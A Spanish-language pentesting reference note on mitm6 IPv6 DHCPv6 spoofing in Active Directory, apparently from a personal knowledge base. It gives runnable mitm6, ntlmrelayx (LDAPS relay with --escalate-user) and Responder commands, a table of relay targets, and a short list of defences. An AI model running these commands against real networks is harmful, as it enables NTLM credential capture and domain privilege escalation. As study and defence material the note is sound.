---
aliases:
  - mitm6
  - IPv6 DHCP Spoofing
tags:
  - estado/completo
  - asset/active-directory
  - technique/credential-access
  - cred/ntlm
kind: Technique
linked:
  - "[[LLMNR & NBT-NS Poisoning]]"
  - "[[NTLM Relay]]"
  - "[[Responder]]"
---
# mitm6 - IPv6 DHCP Spoofing

> [!info]
> Windows prioriza IPv6 sobre IPv4 por default. Atacante hace DHCPv6 spoofing → se vuelve DNS server IPv6 del segmento → captura/relay autenticación.

***

## Mecánica

1. Windows clients piden DHCPv6 al boot/intervalo
2. mitm6 responde con: IPv6 propia + DNS IPv6 = atacante
3. Clients usan atacante como DNS
4. Cuando intentan resolver WPAD u otros names → atacante responde
5. Auth NTLM dirigida a atacante → relay (con `ntlmrelayx`) o captura

***

## Setup

```bash
# Terminal 1: mitm6 spoofing
sudo mitm6 -d domain.local --no-ra

# Terminal 2: ntlmrelayx hacia DC vía LDAP (más útil)
ntlmrelayx.py -6 -wh attacker-wpad -t ldaps://dc.domain.local --escalate-user lowpriv

# O captura simple con Responder
responder -I eth0 -wb
```

***

## Targets / chains comunes

| Target | Resultado |
|---|---|
| `ldap://dc → ldaps://dc` con `--escalate-user` | Grant grupo a user lowpriv |
| `ldap://dc` con `--add-computer` | Crear cuenta computer (10/quota) |
| `smb://target` | Acceso a share |
| `http://target` con session theft | Auth web NTLM |

***

## Defensa

- Disable IPv6 si no se usa.
- DHCPv6 guard en switches.
- LDAP signing + LDAPS Channel Binding (impide relay).
- SMB signing required.

***

## Notas Relacionadas

- [[LLMNR & NBT-NS Poisoning]]
- [[Responder]]
- [[NTLM Relay]]
- [[Authentication Coercion]]
